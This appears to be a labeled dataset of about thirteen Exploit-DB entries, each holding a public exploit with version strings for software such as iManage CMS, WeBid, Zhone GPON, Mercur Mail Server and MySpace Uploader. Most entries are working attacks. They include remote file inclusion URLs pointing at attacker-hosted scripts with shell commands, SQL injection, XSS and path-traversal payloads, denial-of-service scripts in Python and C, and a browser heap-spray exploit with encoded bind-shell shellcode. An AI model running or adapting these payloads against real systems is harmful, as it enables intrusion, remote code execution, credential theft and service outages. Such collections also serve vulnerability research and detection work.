2046,"iManage CMS 4.0.12 - 'absolute_path' Remote File Inclusion ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \  |    __)_ /    \  \//    ~    \/   |   \  |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                              .OR.ID ECHO_ADV_40$2006  --------------------------------------------------------------------------------------------------- [ECHO_ADV_40$2006] iManage CMS <= 4.0.12 (absolute_path) Remote File Inclusion ---------------------------------------------------------------------------------------------------  Author          : Ahmad Maulana a.k.a Matdhule Date Found      : July, 20th 2006 Location        : Indonesia, Jakarta web             : http://advisories.echo.or.id/adv/adv40-matdhule-2006.txt Critical Lvl    : Highly critical Impact          : System access Where           : From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~ iManage CMS from Imaginex-Resource  Application     : iManage CMS version         : 4.0.12 stable URL             : http://www.imaginex-resource.com  ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~  -----------------------component.php---------------------- .... <?php /** *    iManage Version 4.0.12 *    Dynamic portal server and Content managment engine *    03-02-2003 * *    Copyright (C) 2000 - 2003 Imaginex-Resource * *    Site Name: iManage Version 4.0.12 *    File Name: rightComponent.php *    Date: 31/01/2003 *     Version #: 4.0.12 *    Comments: Display all modules which are to be displayed on the right. **/  include($absolute_path.'/language/'.$lang.'/lang_components.php'); ... ----------------------------------------------------------  Input passed to the ""absolute_path"" parameter in component.php is not properly verified before being used. This can be exploited to execute arbitrary PHP code by including files from local or external resources  Affected files:   articles.php contact.php displaypage.php faq.php mainbody.php news.php registration.php whosOnline.php components/com_calendar.php components/com_forum.php components/minibb/index.php components/minibb/bb_admin.php components/minibb/bb_plugins.php modules/mod_calendar.php modules/mod_browser_prefs.php modules/mod_counter.php modules/mod_online.php modules/mod_stats.php modules/mod_weather.php themes/bizz.php themes/default.php themes/simple.php themes/original.php themes/portal.php themes/purple.php  and more :)  Successful exploitation requires that ""register_globals= Off "".  Proof Of Concept: ~~~~~~~~~~~~~  http://target.com/[path]/articles.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/contact.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/displaypage.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/faq.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/mainbody.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/news.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/registration.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/whosOnline.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/components/com_calendar.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/components/com_forum.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/components/minibb/index.php?absolute_path=http://attacker.com//inject.txt? http://target.com/[path]/modules/mod_calendar.php?absolute_path=http://attacker.com//inject.txt?  and more Affected files   Solution: ~~~~~ - Change register_globals= On    in php.ini - Sanitize variable $absolute_path on affected files.  --------------------------------------------------------------------------- Shoutz: ~ ~ solpot a.k.a chris, J4mbi  H4ck3r for the hacking lesson  :)  ~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous ~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama ~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com ~ #mardongan #jambihackerlink #e-c-h-o @irc.dal.net ------------------------------------------------------------------------ --- Contact: ~~        matdhule[at]gmail[dot]com       -------------------------------- [ EOF ]----------------------------------  # milw0rm.com [2006-07-20]",['4.0.12'],1
17868,"WordPress Plugin Mini Mail Dashboard Widget 1.36 - Remote File Inclusion # Exploit Title: Mini Mail Dashboard Widget Wordpress plugin RFI # Google Dork: inurl:wp-content/plugins/mini-mail-dashboard-widget # Date: 09/19/2011 # Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing) # Software Link: http://wordpress.org/extend/plugins/mini-mail-dashboard-widget/download/ # Version: 1.36 (tested)  --- PoC --- http://SERVER/WP_PATH/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=RFI (requires POSTing a file with ID wpmm-upload for this to work)  --- Vulnerable Code --- if (isset($_FILES['wpmm-upload'])) { 	// Create WordPress environmnt 	require_once(urldecode($_REQUEST['abspath']) . 'wp-load.php');  	// Handle attachment 	WPMiniMail::wpmm_upload(); }",['1.36'],1
35859,"Zhone GPON 2520 R4.0.2.566b - Crash (PoC) from httplib2 import Http from urllib import urlencode import sys,time #main function if __name__ == ""__main__"":         if(len(sys.argv) != 2):                 print '*********************************************************************************'                 print ' GPON Zhone R4.0.2.566b D.O.S.'                 print ' Tested on'                 print '          GPON Zhone 2520'                 print '          Hardware: 0040-48-02'                 print '          Software: R4.0.2.566b'                 print '                                 '                 print ' Usage : python', sys.argv[0] + ' <ip>'                 print ' Ex :    python',sys.argv[0] + ' 192.168.15.1'                 print ' Author : Kaczinski lramirez@websec.mx '                 print ' URL : http://www.websec.mx/advisories'                 print '*********************************************************************************'                 sys.exit()  HOST = sys.argv[1] LIMIT = 100000 COUNT = 1 SIZE = 10 BUFFER = ''  while len(BUFFER) < LIMIT:         BUFFER = '\x41' * COUNT         print ""[+] Sending evil buffer with length:"", len(BUFFER)         h = Http()         h.follow_redirects = True         data = dict(XWebPageName=buffer, oldpassword=BUFFER, password="""", password2=""test"", passwdtip=""test"")         try:                 resp, content = h.request(""http://"" + HOST + ""/GponForm/LoginForm"", ""POST"", urlencode(data))         except:                 print ""[+] GPON should be down, is not responding...""                 sys.exit()         COUNT = COUNT * SIZE  print ""[-] GPON not vulnerable""",['2520 R4.0.2.566b'],1
21402,OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow source: https://www.securityfocus.com/bid/4560/info  A buffer overflow condition exists in the OpenSSH server. The condition is exploitable by attackers with valid user credentials in versions 2.9.9 and higher. Exploitation does not require valid user credentials in versions prior to 2.9.9.  The vulnerability is related to the handling of Kerberos 4 TGT/AFS tokens passed by the client. An unbounded string copy operation may result in a stack overflow if the TGT/token data is malformed.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/21402.tar,"['2.x/3.x', '4', '2.9.9', 'prior to 2.9.9']",1
20580,"webid 1.0.4 - Multiple Vulnerabilities   :::::::-.   ...    ::::::.    :::.    ;;,   `';, ;;     ;;;`;;;;,  `;;;    `[[     [[[['     [[[  [[[[[. '[[     $$,    $$$$      $$$  $$$ ""Y$c$$     888_,o8P'88    .d888  888    Y88     MMMMP""`   ""YmmMMMM""""  MMM     YM     [ Discovered by dun \ posdub[at]gmail.com ]    [ 2012-08-17                              ]  ################################################  # [ WeBid <= 1.0.4 ] Multiple Vulnerabilities  #  ################################################  #  # Script: ""Open source php/mysql fully featured auction script""  #  # Vendor:   http://www.webidsupport.com/  # Download: http://sourceforge.net/projects/simpleauction/files/simpleauction/  #  ################################################  # [RFI] ( allow_url_include = On; register_globals = On; )  # PoC: http://localhost/WeBid/loader.php?js=admin/logout.php&include_path=http://localhost/info.txt?  #  # File: ./WeBid/loader.php (lines: 15-60)  #  ..cut..  # ob_start('ob_gzhandler');  # header(""Content-type: text/javascript"");  # include 'includes/checks/files.php';               // 1 ( Definition of $file_hashs array )  # if (isset($_GET['js']))  # {  #    $js = explode(';', $_GET['js']);                // 3 js = admin/logout.php (for example)   #    foreach ($js as $val)  #    {  #       $ext = substr($val, strrpos($val, '.') + 1); // 4  #       if ($ext == 'php')                           // 4  #       {  #          if (check_file($val))                     // 5  #          {  #             include $val;                          // 10 include admin/logout.php  #          }  #       }  #  ..cut..  #    }  # }  # ob_end_flush();  #  # function check_file($file)  # {  #    global $file_hashs;                             // 6  #    $tmp = $file_hashs;  #    $folders = explode('/', $file);                 // 7 $folders = Array([0] => admin, [1] => logout.php)  #    foreach ($folders as $val)                      // 8 This loop checks if parts of $folders are in $file_hashs  #    {  #       if (isset($tmp[$val]))  #       {  #          $tmp = $tmp[$val];  #       }  #       else  #       {  #          return false;  #       }  #    }  #    return true;                                    // 9 admin/logout.php passed  # }  #  ..cut..  #  # File: ./WeBid/includes/checks/files.php (lines: 2-19)  #  ..cut..  # $file_hashs = array(                                      // 2 List of files that can be included.  #  ..cut..  #    'admin' => array(                                      // 2   #       'logout.php' => 'a0db39b73dcfd29feb1466002c4f59a4', // 2  #        ..cut..  #    ),  #  ..cut..  # );  #  # File: ./WeBid/admin/logout.php (lines: 16-17)  #  ..cut..                                           // 11 common.inc.php file contains a definition of $include_path  # include '../includes/common.inc.php';              // 11 Failed, because loader.php is in root path  # include $include_path . 'functions_admin.php';     // 12 *[RFI] $include_path is not set by script  #  ..cut..                                           // 12 If register_globals is On, we can set $include_path  #  ################################################  # [Local File Disclosure] ( magic_quotes_gpc = Off; php version < 5.3.4 )  # PoC: http://localhost/WeBid/getthumb.php?fromfile=getthumb.php&w=../../../../../etc/passwd%00  #  # File: ./WeBid/getthumb.php (lines: 17-52)  #  ..cut..  # $w = (isset($_GET['w'])) ? $_GET['w'] : '';                                      // 1  # $fromfile = (isset($_GET['fromfile'])) ? $_GET['fromfile'] : '';                 // 2  # $nomanage = false;  #  ..cut..  # if (!isset($_GET['fromfile']))                                                   // 3  # {  #    ErrorPNG('params empty');  #    exit;  # }  # elseif (!file_exists($_GET['fromfile']) && !fopen($_GET['fromfile'], 'r'))       // 4  # {  #    ErrorPNG('img does not exist');  #    exit;  # }  #  # if (file_exists($upload_path . 'cache/' . $_GET['w'] . '-' . md5($fromfile)))    // 5  # {  #    $img = getimagesize($fromfile);  #    if ($img[2] == 1)  #    {  #       $img['mime'] = 'image/png';  #    }  #    header('Content-type: ' . $img['mime']);  #    echo file_get_contents($upload_path . 'cache/' . $_GET['w'] . '-' . md5($fromfile)); // 6 *[LFD]  #    }  # }  #  ..cut..  #  ################################################  # [Blind SQL Injection] ( magic_quotes_gpc = Off; )  # PoC:  # http://localhost/WeBid/contents.php  # GET /WeBid/contents.php HTTP/1.1  # Host: localhost  # User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1  # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  # Accept-Language: pl,en-us;q=0.7,en;q=0.3  # Accept-Encoding: gzip, deflate  # Connection: keep-alive  # Cookie: WEBID_ONLINE=-1' OR 1=1--  #  # File: ./WeBid/contents.php (lines: 15, 38)  #  ..cut..  # include 'includes/common.inc.php';  #  ..cut..  # include 'header.php';                                        // 1  #  ..cut..  #  # File: ./WeBid/header.php (line: 26)  #  ..cut..  # $counters = load_counters();                                 // 2  #  ..cut..  #  # File: ./WeBid/includes/functions_global.php (line: 287-320)  #  ..cut..  # function load_counters()                                     // 3  # {  #  ..cut..  #      if (!$user->logged_in)  #      {  #         if (!isset($_COOKIE['WEBID_ONLINE']))  #         {  #            $s = md5(rand(0, 99) . session_id());  #            setcookie('WEBID_ONLINE', $s, time() + 900);  #         }  #         else  #         {  #            $s = $_COOKIE['WEBID_ONLINE'];                    // 4  #            setcookie('WEBID_ONLINE', $s, time() + 900);  #         }  #      }  #  ..cut..  #      $query = ""SELECT id FROM "" . $DBPrefix . ""online WHERE SESSION = '$s'""; // 5 *[SQL]  #      $res = mysql_query($query);  #      $system->check_mysql($res, $query, __LINE__, __FILE__);  #  ..cut..  #  ### [ dun / 2012 ] #############################",['1.0.4'],1
21405,"Jon Howell Faq-O-Matic 2.7 - Cross-Site Scripting source: https://www.securityfocus.com/bid/4565/info  Faq-O-Matic 2.711 and 2.712 is a web-based Frequently Asked Question (FAQ) management system. It is vulnerable to a cross site scripting issue arising from a failure to filter HTML or script from a malformed query, returning the submitted script as an error message which is then processed by the browser. This is done by submitting the script as an argument to the Faq-O-Matic component ""fom.cgi"" - specifically, to the ""file"" parameter. This script is then treated by the user's browser as though it originated from the Faq-O-Matic web site.  http://www.wherever.tld/path_to_Faq-O-Matic/fom?file=<script>alert('If+this+script+was+modified,+it+could+easily+steal+amigadev.net+cookies+and+log+them+to+a+remote+location')</script>&step","['2.7', '2.711', '2.712']",1
1778,"Foing 0.7.0 - 'phpBB' Remote File Inclusion # Kurdish Security Advisory # Original Advisory : http://kurdishsecurity.blogspot.com/2006/05/kurdish-security-7-foing-remote-file.html # Foing Remote File Include Vulnerability [PHPBB] :} # ""Ey Tarih ya sana basarilar atfedecegiz ya da seni yasanmamis sayacagiz ."" Abdullah Ocalan # STOP THE MASSACRE IN THE TURKEY! FREEDOM FOR KURDISTAN ! # Contact : irc.gigachat.net #kurdhack & www.PatrioticHackers.com & botan@linuxmail.org # Risk : High # Class : Remote # Script : Foing # Script Website : http://foing.sourceforge.net/ # Version : Foing 0.7.0                  0.6.0                  0.5.0                  0.4.0                  0.3.0                  0.2.0 # w0rkz : ""Powered by foing""  # Thanks : B3g0k, Nistiman, Flot, Netqurd, Darki, Azad, ColdHackers, Kurdistan Cyber Army etc..  --------------------------------------------------------------------------------  # cmd shell example: # cmd shell variable: ($_GET[cmd]);  Vulnerable code :  Get along at directory config.php  did you meet of ..  <?php  define('FOING_INSTALLED', true);  $phpbb_root_path = '../'; $foing_prefix = $table_prefix;  ?>  Proof Of Concept : http://www.r0xed.com/[foingpath]/index.php?phpbb_root_path=http://evilcode.txt?&cmd=uname -a http://www.r0xed.com/[foingpath]/song.php?phpbb_root_path=http://evilcode.txt?&cmd=uname -a http://www.r0xed.com/[foingpath]/faq.php?phpbb_root_path=http://evilcode.txt?&cmd=uname -a http://www.r0xed.com/[foingpath]/list.php?phpbb_root_path=http://evilcode.txt?&cmd=uname -a http://www.r0xed.com/[foingpath]/gen_m3u.php?phpbb_root_path=http://evilcode.txt?&cmd=uname -a http://www.r0xed.com/[foingpath]/playlist.php?phpbb_root_path=http://evilcode.txt?&cmd=uname -a  # milw0rm.com [2006-05-12]",['0.7.0'],1
5025,"MySpace Uploader - 'MySpaceUploader.ocx 1.0.0.4' Remote Buffer Overflow <!--  MySpace Uploader Buffer Overflow Exploit  written by e.b. Tested on Windows XP SP2(fully patched) English, IE6  MySpaceUploader.ocx version 1.0.0.4: {48DD0448-9209-4F81-9F6D-D83562940134} Aurigma ImageUploader4.ocx version version 4.5.70.0: {6E5E167B-1566-4316-B27F-0DDAB3484CF7} Thanks to h.d.m. and the Metasploit crew  --> <html>  <head>   <title>MySpace Uploader Buffer Overflow Exploit</title>   <script language=""JavaScript"" defer>     function Check() {             // win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com  var shellcode1 = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949"" +                           ""%u4948%u4949%u4949%u4949%u4949%u4949%u5a51%u436a"" +                           ""%u3058%u3142%u4250%u6b41%u4142%u4253%u4232%u3241"" +                           ""%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u4d4c"" +                           ""%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c"" +                           ""%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f"" +                           ""%u6e68%u736b%u716f%u6530%u6a51%u724b%u4e69%u366b"" +                           ""%u4e54%u456b%u4a51%u464e%u6b51%u4f70%u4c69%u6e6c"" +                           ""%u5964%u7350%u5344%u5837%u7a41%u546a%u334d%u7831"" +                           ""%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955"" +                           ""%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b"" +                           ""%u726c%u4c6b%u534b%u376f%u636c%u6a31%u4e4b%u756b"" +                           ""%u6c4c%u544b%u4841%u4d6b%u5159%u514c%u3434%u4a44"" +                           ""%u3063%u6f31%u6230%u4e44%u716b%u5450%u4b70%u6b35"" +                           ""%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530"" +                           ""%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b"" +                           ""%u6c30%u5770%u5770%u4770%u4c70%u704b%u4768%u714c"" +                           ""%u444f%u6b71%u3346%u6650%u4f36%u4c79%u6e38%u4f63"" +                           ""%u7130%u306b%u4150%u5878%u6c70%u534a%u5134%u334f"" +                           ""%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377"" +                           ""%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f"" +                           ""%u4147%u4163%u504c%u4273%u3159%u5063%u6574%u7035"" +                           ""%u546d%u6573%u3362%u306c%u4163%u7071%u536c%u6653"" +                           ""%u314e%u7475%u7038%u7765%u4370"");  // win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com  var shellcode2 = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949"" +                           ""%u4949%u4949%u4949%u4949%u4949%u4937%u5a51%u436a"" +                           ""%u3058%u3142%u4150%u6b42%u4141%u4153%u4132%u3241"" +                           ""%u4142%u4230%u5841%u3850%u4241%u7875%u4b69%u724c"" +                           ""%u584a%u526b%u4a6d%u4a48%u6b59%u6b4f%u694f%u416f"" +                           ""%u4e70%u526b%u744c%u4164%u6e34%u376b%u5535%u4c6c"" +                           ""%u714b%u646c%u6145%u7468%u6a41%u6e4f%u626b%u326f"" +                           ""%u6c38%u334b%u376f%u5550%u7851%u316b%u6c59%u504b"" +                           ""%u6e34%u466b%u6861%u456e%u6f61%u6c30%u6c59%u6b6c"" +                           ""%u3934%u4150%u3764%u6877%u6941%u565a%u636d%u4b31"" +                           ""%u7872%u6c6b%u7534%u566b%u3134%u5734%u5458%u6b35"" +                           ""%u6e55%u336b%u556f%u7474%u7841%u416b%u4c76%u464b"" +                           ""%u626c%u6e6b%u416b%u354f%u564c%u6861%u666b%u3663"" +                           ""%u6c4c%u6b4b%u7239%u444c%u5764%u616c%u4f71%u4733"" +                           ""%u6b41%u336b%u4c54%u634b%u7073%u6c30%u534b%u6470"" +                           ""%u6c4c%u724b%u4550%u4e4c%u6c4d%u374b%u7530%u7358"" +                           ""%u426e%u4c48%u524e%u466e%u586e%u566c%u3930%u586f"" +                           ""%u7156%u4676%u7233%u6346%u3058%u7033%u3332%u5458"" +                           ""%u5237%u4553%u5162%u504f%u4b54%u5a4f%u3370%u6a58"" +                           ""%u686b%u596d%u456c%u466b%u4930%u596f%u7346%u4e6f"" +                           ""%u5869%u7365%u4d56%u5851%u366d%u6468%u7242%u7275"" +                           ""%u674a%u5972%u6e6f%u7230%u4a48%u5679%u6b69%u6e45"" +                           ""%u764d%u6b37%u584f%u3356%u3063%u5053%u7653%u7033"" +                           ""%u3353%u5373%u3763%u5633%u6b33%u5a4f%u3270%u5046"" +                           ""%u3568%u7141%u304c%u3366%u6c63%u6d49%u6a31%u7035"" +                           ""%u6e68%u3544%u524a%u4b50%u7177%u4b47%u4e4f%u3036"" +                           ""%u526a%u3130%u7041%u5955%u6e6f%u3030%u6c68%u4c64"" +                           ""%u546d%u796e%u3179%u5947%u596f%u4646%u6633%u6b35"" +                           ""%u584f%u6350%u4b58%u7355%u4c79%u4146%u6359%u4b67"" +                           ""%u784f%u7656%u5330%u4164%u3344%u7965%u4e6f%u4e30"" +                           ""%u7173%u5878%u6167%u6969%u7156%u6269%u3977%u6a6f"" +                           ""%u5176%u4945%u4e6f%u5130%u5376%u715a%u7274%u6246"" +                           ""%u3048%u3063%u6c6d%u5a49%u6345%u625a%u7670%u3139"" +                           ""%u5839%u4e4c%u4d69%u5337%u335a%u4e74%u4b69%u5652"" +                           ""%u4b51%u6c70%u6f33%u495a%u336e%u4472%u6b6d%u374e"" +                           ""%u7632%u6e4c%u6c73%u704d%u767a%u6c58%u4e6b%u4c4b"" +                           ""%u736b%u5358%u7942%u6d6e%u7463%u6b56%u304f%u7075"" +                           ""%u4b44%u794f%u5346%u706b%u7057%u7152%u5041%u4251"" +                           ""%u4171%u337a%u4231%u4171%u5141%u6645%u6931%u5a6f"" +                           ""%u5070%u6e68%u5a4d%u5679%u6865%u334e%u3963%u586f"" +                           ""%u6356%u4b5a%u4b4f%u704f%u4b37%u4a4f%u4c70%u614b"" +                           ""%u6b47%u4d4c%u6b53%u3174%u4974%u596f%u7046%u5952"" +                           ""%u4e6f%u6330%u6c58%u6f30%u577a%u6174%u324f%u4b73"" +                           ""%u684f%u3956%u386f%u4350"");   	var bigblock = unescape(""%u0A0A%u0A0A""); 	var headersize = 20; 	var slackspace = headersize + shellcode1.length; 	while (bigblock.length < slackspace) bigblock += bigblock; 	var fillblock = bigblock.substring(0,slackspace); 	var block = bigblock.substring(0,bigblock.length - slackspace); 	while (block.length + slackspace < 0x40000) block = block + block + fillblock;  	  	var memory = new Array(); 	for (i = 0; i < 500; i++){ memory[i] = block + shellcode1 } 	 	var buf = """" 	for (i = 0; i < 600; i++) { buf = buf + unescape(""%u0A0A"") }  	obj.Action = buf;  }         </script>   </head>  <body onload=""JavaScript: return Check();"">     <object id=""obj"" classid=""clsid:48DD0448-9209-4F81-9F6D-D83562940134"">      Unable to create object     </object>  </body> </html>  # milw0rm.com [2008-01-31]","[""1.0.0.4'""]",1
11721,"GeekHelps ADMP 1.01 - Multiple Vulnerabilities #########################local file include / sql injection################# Author: ItSecTeam  download from:http://geekhelps.net/download.php  script:ADMP  remote:yes  dork::D *********************lfi******************* vul1:/path/themes/colorvoid/footer.php include(""./themes/$style/info.php""); ?> line 3  vuls:themes/default-green/footer.php themes/default-orange/footer.php themes/default/footer.php  include(""./themes/$style/info.php""); ?> line 4 --------------------------------------------  xpl lfi:/path/themes/colorvoid/footer.php?style=[lfi]%00 xpl lfi:/path/themes/default-green/footer.php ?style=[lfi]%00  xpl lfi:/path/themes/default-orange/footer.php?style=[lfi]%00 xpl lfi:/path/themes/default/footer.php?style=[lfi]%00  xpl sql:/path/bannershow.php?click=' sql injection code  ########################  discovered by ahmadbady  ########################",['1.01'],1
33978,"TomatoCMS 2.0.x - SQL Injection source: https://www.securityfocus.com/bid/40108/info  TomatoCMS is prone to a SQL-injection vulnerability and multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.  Exploiting these issues may allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database or to execute HTML and script code in the context of the affected site, to steal cookie-based authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.  TomatoCMS 2.0.6 and prior are vulnerable.   http://www.example.com/news/search?q=sdf%22+ANY_SQL_HERE","['2.0.x', '2.0.6', 'prior']",1
7934,"Spider Player 2.3.9.5 - '.asx' Off-by-One Crash #exploit.py #Spider Player 2.3.9.5 Crash Exploit #others files can be used for crash  m3u , pls ....   print "" Spider Player 2.3.9.5 off by one Crash Exploit ( asx file ) \n""           	 header1 = ( 			""\x3C\x41\x53\x58\x20\x56\x45\x52\x53\x49\x4F\x4E\x3D\x22\x33"" 		        ""\x2E\x30\x22\x3E\x0A\x0A\x3C\x45\x4E\x54\x52\x59\x3E\x3C\x54"" 			""\x49\x54\x4C\x45\x3E\x65\x78\x70\x6C\x6F\x69\x74\x3C\x2F\x54"" 			""\x49\x54\x4C\x45\x3E\x0A\x3C\x52\x45\x46\x20\x48\x52\x45\x46"" 			""\x3D\x22"" 			)  header2 = ( 			""\x2E\x61\x73\x66\x22\x2F\x3E\x0A\x3C\x2F\x45\x4E\x54\x52\x59"" 			""\x3E\x3C\x2F\x41\x53\x58\x3E"" 		   ) 			 crash = ""\x41"" * 10000  exploit = header1 + crash  + header2  try:     out_file = open(""crash.asx"",'w')     out_file.write(exploit)     out_file.close()     raw_input(""\nExploit file created!\n"") except:     print ""Error""  # milw0rm.com [2009-01-30]",['2.3.9.5'],1
45271,"Responsive FileManager < 9.13.4 - Directory Traversal The following vulnerabilities were fixed in the version 9.13.4. https://responsivefilemanager.com  #1 Path Traversal Allows to Read Any File  Reserved CVE: CVE-2018-15535 Discovered By: Simon Uvarov Vendor Status: Fixed  Details:  The following request allows a user to read any file on the system.      GET /filemanager/ajax_calls.php?action=get_file&sub_action=preview&preview_mode=text&title=source&file=../../../../etc/passwd HTTP/1.1     Host: 192.168.5.129     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0     Accept: */*     Accept-Language: en-US,en;q=0.5     Accept-Encoding: gzip, deflate     Referer: http://192.168.5.129/filemanager/dialog.php?type=0&popup=1     X-Requested-With: XMLHttpRequest     Cookie: last_position=%2F; PHPSESSID=na248cef3f937mtql67dvu8fk5     Connection: close  #2 Path Traversal While Upacking Archives  Reserved CVE: CVE-2018-15536 Discovered By: Simon Uvarov Vendor Status: Fixed  The following request starts unpacking the exploit.zip archive:      POST /filemanager/ajax_calls.php?action=extract HTTP/1.1     Host: 192.168.5.129     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0     Accept: */*     Accept-Language: en-US,en;q=0.5     Accept-Encoding: gzip, deflate     Referer: http://192.168.5.129/filemanager/dialog.php?type=0&lang=en_EN&popup=1&crossdomain=0&relative_url=0&akey=key&fldr=&5b6d9b91535a9&1533909952983     Content-Type: application/x-www-form-urlencoded; charset=UTF-8     X-Requested-With: XMLHttpRequest     Content-Length: 16     Cookie: last_position=%2F; PHPSESSID=na248cef3f937mtql67dvu8fk5     Connection: close         path=exploit.zip  Bases64-encoded example of exploit.zip which creates source.txt in /tmp/ directory:      UEsDBBQAAAAAALZNmkR7I19kDgAAAA4AAAAmAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1w     L3NvdXJjZS50eHR1cGxvYWRzIGZvbGRlclBLAQIUAxQAAAAAALZNmkR7I19kDgAAAA4AAAAmAAAA     AAAAAAAAAADtgQAAAAAuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi90bXAvc291cmNlLnR4dFBLBQYA     AAAAAQABAFQAAABSAAAAAAA=  It is possible to create archives containing ../../ as a part of a file path, now it's famous as ZipSlip vulnerability, but it's an old bug.  It is impossible to upload .php files or .htaccess file using this method, but itas possible to create different files with ""legal"" extensions on a system and it may lead to remote code execution if a server runs with enough privileges, for example, to create cron jobs.",['< 9.13.4'],1
19806,"Atrium Software Mercur Mail Server 3.2 - Multiple Buffer Overflows (1) // source: https://www.securityfocus.com/bid/1051/info  Atrium Software Mercur is a SMTP, POP3, and IMAP mail server. Insufficient boundary checking exists in the code that handles within the SMTP ""mail from"" command, the POP3 ""user"" command and the IMAP ""login"" command. The application will crash if an overly long string is used as an argument to any of these commands.    */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/socket.h> #include <sys/types.h> #include <netdb.h> #include <netinet/in.h> #include <arpa/inet.h>  void usage (char *progname) {   fprintf (stderr, ""Usage: %s <hostname> [type]\n"", progname);   fprintf (stderr, ""   Type:\n"");   fprintf (stderr, ""      0 - IMAP4 (Default)\n"");   fprintf (stderr, ""      1 - POP3\n"");   fprintf (stderr, ""      2 - SMTP\n\n"");   exit (1); }  int main (int argc, char **argv) {   char *ptr, buffer[3000], remotedos[3100];   int aux, sock, type;   struct sockaddr_in sin;   unsigned long ip;   struct hostent *he;    fprintf (stderr,    ""\n-= Remote DoS for Mercur 3.2 - (C) |[TDP]| - H13 Team =-\n"");    if (argc < 2)     usage (argv[0]);    type = 0;   if (argc > 2)     type = atol (argv[2]);    ptr = buffer;   switch (type)     {     case 1:       memset (ptr, 0, 2048);       memset (ptr, 88, 2046);       break;     default:       memset (ptr, 0, sizeof (buffer));       memset (ptr, 88, sizeof (buffer) - 2);       break;     }    bzero (remotedos, sizeof (remotedos));    switch (type)     {     case 1:       snprintf (remotedos, sizeof (remotedos), ""USER %s\r\n\r\n\r\n"", = buffer);       break;     case 2:       snprintf (remotedos, sizeof (remotedos), ""MAIL FROM: %s@ThiSiSaDoS.c0m\r\n\r\n\r\n"", buffer);       break;     default:       snprintf (remotedos, sizeof (remotedos), ""1000 LOGIN = %s\r\n\r\n\r\n"", buffer);       break;     }    if ((sock = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)     {       perror (""socket()"");       return -1;     }    if ((he = gethostbyname (argv[1])) != NULL)     {       ip = *(unsigned long *) he->h_addr;     }   else     {       if ((ip = inet_addr (argv[1])) == NULL) {   perror (""inet_addr()"");   return -1; }     }    sin.sin_family = AF_INET;   sin.sin_addr.s_addr = ip;    switch (type)     {     case 1:       sin.sin_port = htons (110);       break;     case 2:       sin.sin_port = htons (25);       break;     default:       sin.sin_port = htons (143);       break;     }    if (connect (sock, (struct sockaddr *) &sin, sizeof (sin)) < 0)     {       perror (""connect()"");       return -1;     }    switch (type)     {     case 1:       fprintf (stderr, ""\nEngaged Mercur POP3... Sending data...\n"");       break;     case 2:       fprintf (stderr, ""\nEngaged Mercur SMTP... Sending data...\n"");       break;     default:       fprintf (stderr, ""\nEngaged Mercur IMAP4... Sending data...\n"");       break;     }    if (write (sock, remotedos, strlen (remotedos)) < strlen (remotedos))     {       perror (""write()"");       return -1;     }    sleep (4);    fprintf (stderr, ""Bye Bye baby!...\n\n"");   if (close (sock) < 0)     {       perror (""close()"");       return -1;     }    return (0); }",['3.2'],1
